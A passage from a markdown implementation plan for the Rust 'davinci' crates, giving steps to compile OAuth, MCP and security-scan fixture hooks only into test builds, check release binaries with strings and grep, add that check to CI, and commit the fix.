        .then(|| std::env::var("PI_OAUTH_TOKEN_URL").ok())
        .flatten()
        .unwrap_or_else(|| request.url.clone());
```

`davinci-mcp/src/http.rs:257`: `if !crate::fixtures::enabled() { return None; }` before the env read (keep the `fixture:<path>` URL form behind the same check). Security-scan reads: wrap in `if fixtures_enabled()`. `main.rs:6540` (`value.starts_with("pi-fixture-")` in `looks_like_oauth_input` or similar): gate the same way.

- [ ] **Step 4: Run the full test suites**

Run: `cargo test -p davinci-ai -p davinci-mcp -p davinci-coding-agent`
Expected: PASS (fixtures active in test builds).

- [ ] **Step 5: Prove release builds do not contain them**

Run: `cargo build --release -p davinci-coding-agent` then

```bash
strings target/release/davinci* | grep -c "PI_OAUTH_FIXTURE\|PI_OAUTH_REFRESH_URL\|PI_OAUTH_TOKEN_URL\|PI_MCP_FIXTURE\|PI_SECURITY_SCAN_FIXTURE"
```

Expected: `0`. Add the same check as a step in `.github/workflows/ci.yml` in the release-build job (Linux only; `strings` is present on ubuntu-latest).

- [ ] **Step 6: Commit**

```bash
git add crates/davinci-ai crates/davinci-mcp crates/davinci-coding-agent .github/workflows/ci.yml Cargo.lock
git commit -m "fix(security): compile credential fixture hooks only into test builds"
```

---

## Phase 2 exit check

```bash
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test -p davinci-sys -p davinci-ai -p davinci-mcp -p davinci-agent -p davinci-coding-agent
```

All must pass. Then do the manual check in `00-index.md` → "Manual verification: trust".
